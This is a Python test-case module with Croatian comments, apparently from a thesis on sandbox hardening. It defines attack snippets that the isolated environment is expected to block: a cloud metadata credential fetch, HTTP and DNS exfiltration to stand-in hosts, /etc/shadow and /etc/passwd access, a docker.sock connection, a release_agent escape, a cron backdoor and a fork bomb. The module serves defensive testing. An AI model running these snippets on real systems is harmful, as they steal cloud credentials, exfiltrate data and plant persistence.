"""Definicije testnih slucajeva S1-S5.

Scenariji su izvedeni iz vektora napada opisanih u potpoglavlju 2.2.2 rada:

  S1 - pokusaj bijega iz izolacije (sistemski pozivi, ovlasti, imenski prostori)
  S2 - pristup datotecnom sustavu domacina (citanje i pisanje izvan sandboxa)
  S3 - mrezna eksfiltracija i pristup metapodatkovnoj usluzi (169.254.169.254)
  S4 - iscrpljivanje resursa (memorija, procesi, procesorsko vrijeme)
  S5 - perzistencija i lateralno kretanje

Za svaki slucaj biljezi se ocekivani ishod. "expect_blocked=True" znaci da
ocvrsnuto okruzenje napad mora zaustaviti; ako se izvrsi do kraja, izolacija je
probijena. Polje "expected_mechanism" navodi mehanizam za koji se ocekuje da ce
napad zaustaviti i usporeduje se sa stvarno zabiljezenim (odgovor na IP2).
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional


@dataclass(frozen=True)
class AttackCase:
    id: str
    scenario: str
    title: str
    code: str
    expect_blocked: bool
    expected_mechanism: Optional[str]
    note: str = ""


CASES: List[AttackCase] = [
    # ---------------------------------------------------------------- S1
    AttackCase(
        id="S1-01", scenario="S1", title="Ucitavanje modula jezgre",
        code=(
            "import ctypes, os\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "# init_module nije u seccomp allowlisti -> EPERM\n"
            "res = libc.syscall(175, 0, 0, 0)\n"
            "print('syscall vratio', res, 'errno', ctypes.get_errno())\n"
            "raise SystemExit(0 if res == 0 else 1)\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
        note="init_module blokira seccomp jos prije nego dosegne jezgru",
    ),
    AttackCase(
        id="S1-02", scenario="S1", title="unshare novog imenskog prostora",
        code=(
            "import ctypes\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "CLONE_NEWUSER = 0x10000000\n"
            "res = libc.unshare(CLONE_NEWUSER)\n"
            "print('unshare', res, ctypes.get_errno())\n"
            "raise SystemExit(0 if res == 0 else 1)\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-03", scenario="S1", title="montiranje datotecnog sustava",
        code=(
            "import ctypes\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "res = libc.mount(b'proc', b'/mnt', b'proc', 0, 0)\n"
            "print('mount', res, ctypes.get_errno())\n"
            "raise SystemExit(0 if res == 0 else 1)\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-04", scenario="S1", title="ptrace nad drugim procesom",
        code=(
            "import ctypes\n"
            "libc = ctypes.CDLL(None, use_errno=True)\n"
            "res = libc.ptrace(0, 1, 0, 0)  # PTRACE_TRACEME/ATTACH varijanta\n"
            "print('ptrace', res, ctypes.get_errno())\n"
            "raise SystemExit(0 if res == 0 else 1)\n"
        ),
        expect_blocked=True, expected_mechanism="seccomp",
    ),
    AttackCase(
        id="S1-05", scenario="S1", title="upis u release_agent (CVE-2022-0492)",
        code=(
            "# Pokusaj klasicnog bijega preko cgroups v1 release_agent.\n"
            "# Zahtijeva CAP_SYS_ADMIN i mogucnost montiranja; oboje je uklonjeno.\n"
            "open('/sys/fs/cgroup/x/release_agent','w').write('/tmp/x')\n"
            "print('upis uspio - izolacija probijena')\n"
        ),
        expect_blocked=True, expected_mechanism="capabilities",
    ),
    # ---------------------------------------------------------------- S2
    AttackCase(
        id="S2-01", scenario="S2", title="citanje /etc/shadow domacina",
        code=(
            "data = open('/etc/shadow').read()\n"
            "print('procitano', len(data), 'bajtova')\n"
        ),
        expect_blocked=True, expected_mechanism="capabilities",
        note="unutar sandboxa /etc/shadow ne postoji ili je necitljiv za nobody",
    ),
    AttackCase(
        id="S2-02", scenario="S2", title="pisanje u /usr/bin (rootfs)",
        code=(
            "open('/usr/bin/evil','w').write('#!/bin/sh\\n')\n"
            "print('zapisano na rootfs')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    AttackCase(
        id="S2-03", scenario="S2", title="izlazak iz /sandbox putanjom",
        code=(
            "open('/sandbox/../etc/passwd','a').write('x')\n"
            "print('izmijenjen /etc/passwd')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    AttackCase(
        id="S2-04", scenario="S2", title="pristup docker socketu domacina",
        code=(
            "import socket\n"
            "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
            "s.connect('/var/run/docker.sock')\n"
            "print('spojen na docker.sock - potpuni nadzor domacina')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
        note="socket ne smije biti montiran u okruzenje; ocekuje se FileNotFound",
    ),
    # ---------------------------------------------------------------- S3
    AttackCase(
        id="S3-01", scenario="S3", title="dohvat IAM vjerodajnica s metapodataka",
        code=(
            "import urllib.request\n"
            "url='http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
            "print(urllib.request.urlopen(url, timeout=3).read().decode())\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
        note="najvazniji test: uspjeh znaci krada vjerodajnica racuna u oblaku",
    ),
    AttackCase(
        id="S3-02", scenario="S3", title="eksfiltracija na vanjski posluzitelj",
        code=(
            "import urllib.request\n"
            "urllib.request.urlopen('http://example.com/?d=tajna', timeout=3)\n"
            "print('podaci poslani van')\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
    ),
    AttackCase(
        id="S3-03", scenario="S3", title="DNS eksfiltracija",
        code=(
            "import socket\n"
            "socket.gethostbyname('tajna.napadac.example')\n"
            "print('DNS upit rijesen')\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
    ),
    AttackCase(
        id="S3-04", scenario="S3", title="skeniranje unutarnje mreze (lateralno)",
        code=(
            "import socket\n"
            "s=socket.socket(); s.settimeout(2)\n"
            "s.connect(('10.0.0.1', 22))\n"
            "print('otvoren unutarnji port - lateralno kretanje moguce')\n"
        ),
        expect_blocked=True, expected_mechanism="network_policy",
    ),
    # ---------------------------------------------------------------- S4
    AttackCase(
        id="S4-01", scenario="S4", title="iscrpljivanje memorije",
        code=(
            "blob = bytearray()\n"
            "while True:\n"
            "    blob.extend(b'x' * (10 * 1024 * 1024))\n"
        ),
        expect_blocked=True, expected_mechanism="cgroups_memory",
    ),
    AttackCase(
        id="S4-02", scenario="S4", title="fork bomba",
        code=(
            "import os\n"
            "while True:\n"
            "    try:\n"
            "        os.fork()\n"
            "    except OSError:\n"
            "        pass\n"
        ),
        expect_blocked=True, expected_mechanism="cgroups_pids",
    ),
    AttackCase(
        id="S4-03", scenario="S4", title="beskonacna petlja (procesorsko vrijeme)",
        code=(
            "x = 0\n"
            "while True:\n"
            "    x += 1\n"
        ),
        expect_blocked=True, expected_mechanism="timeout",
        note="cgroups ogranicava udio CPU-a, a vremensko ogranicenje prekida izvrsavanje",
    ),
    AttackCase(
        id="S4-04", scenario="S4", title="popunjavanje diska u /tmp",
        code=(
            "with open('/tmp/fill','wb') as f:\n"
            "    while True:\n"
            "        f.write(b'x' * (10*1024*1024))\n"
        ),
        expect_blocked=True, expected_mechanism="cgroups_memory",
        note="/tmp je tmpfs ogranicene velicine; punjenje pogada tmpfs, ne domacina",
    ),
    # ---------------------------------------------------------------- S5
    AttackCase(
        id="S5-01", scenario="S5", title="perzistencija preko cron zapisa",
        code=(
            "open('/etc/cron.d/backdoor','w').write('* * * * * root sh -c :\\n')\n"
            "print('cron zadatak postavljen')\n"
        ),
        expect_blocked=True, expected_mechanism="read_only_fs",
    ),
    AttackCase(
        id="S5-02", scenario="S5", title="podizanje ovlasti preko setuid",
        code=(
            "import os\n"
            "os.setuid(0)\n"
            "print('postao root, uid =', os.getuid())\n"
        ),
        expect_blocked=True, expected_mechanism="capabilities",
    ),
    AttackCase(
        id="S5-03", scenario="S5", title="pokretanje vanjskog procesa (ljuska)",
        code=(
            "import subprocess\n"
            "print(subprocess.check_output(['/bin/sh','-c','id']).decode())\n"
        ),
        expect_blocked=True, expected_mechanism="none",
        note="ljuska mozda ne postoji u minimalnoj slici; biljezi se stvarni ishod",
    ),
    # ---------------------------------------------------------- kontrola
    AttackCase(
        id="C-01", scenario="C", title="dobrocudan racunski zadatak",
        code=(
            "print(sum(i*i for i in range(1000)))\n"
        ),
        expect_blocked=False, expected_mechanism="none",
        note="kontrolni slucaj: mora se izvrsiti do kraja u svakoj konfiguraciji",
    ),
    AttackCase(
        id="C-02", scenario="C", title="dobrocudan zapis u /tmp",
        code=(
            "open('/tmp/rezultat.txt','w').write('ok')\n"
            "print(open('/tmp/rezultat.txt').read())\n"
        ),
        expect_blocked=False, expected_mechanism="none",
        note="zapis u tmpfs mora biti dopusten; provjera da izolacija nije prestroga",
    ),
]


def by_scenario() -> dict:
    out: dict = {}
    for c in CASES:
        out.setdefault(c.scenario, []).append(c)
    return out
